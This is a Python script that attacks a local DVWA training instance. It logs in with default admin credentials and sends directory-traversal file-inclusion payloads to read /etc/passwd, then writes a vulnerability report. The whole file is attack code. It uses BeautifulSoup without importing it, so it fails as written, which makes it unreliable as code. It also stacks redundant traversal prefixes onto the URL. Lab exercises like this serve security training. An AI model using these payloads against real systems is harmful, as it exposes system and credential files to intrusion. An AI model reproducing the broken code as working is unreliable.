import requests

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
VULN_URL = 'http://localhost/dvwa/vulnerabilities/fi/?page=../../../../'
REPORT_FILE = 'fileinclusionreport.txt'

# Function to perform file inclusion and retrieve data
def perform_file_inclusion(session, payload):
    target_url = f'{VULN_URL}{payload}'
    response = session.get(target_url)
    return target_url, response.text

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    session = requests.Session()
    login_page = session.get('http://localhost/dvwa/login.php')
    soup = BeautifulSoup(login_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Debugging: Print CSRF token
    print(f'CSRF Token: {csrf_token}')

    # Login data
    login_data = {
        'username': 'admin',
        'password': 'admin',
        'Login': 'Login',
        'user_token': csrf_token
    }

    # Perform login
    response = session.post('http://localhost/dvwa/login.php', data=login_data)

    # Debugging: Print login response
    print(f'Login response status: {response.status_code}')
    print(response.text)

    if 'Login failed' in response.text:
        print('Login failed')
        return None
    
    return session

# Function to write report
def write_report(results):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA Directory Traversal Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for payload, (target_url, response_text) in results.items():
            report_file.write(f'Test Payload: {payload}\n')
            report_file.write(f'Target URL: {target_url}\n\n')

            if 'Warning: include' in response_text:
                report_file.write('Directory traversal vulnerability detected!\n')
            else:
                report_file.write('No directory traversal vulnerability detected.\n')

            report_file.write('='*40 + '\n\n')

# Main function to run the directory traversal tests
def run_directory_traversal_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # Directory Traversal payloads
    payloads = [
        '../etc/passwd',
        './../../../../etc/passwd',
        '../../../../../../../../../../../../etc/passwd'
    ]

    for payload in payloads:
        target_url, response_text = perform_file_inclusion(session, payload)
        results[payload] = (target_url, response_text)

    session.close()
    write_report(results)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_directory_traversal_tests()
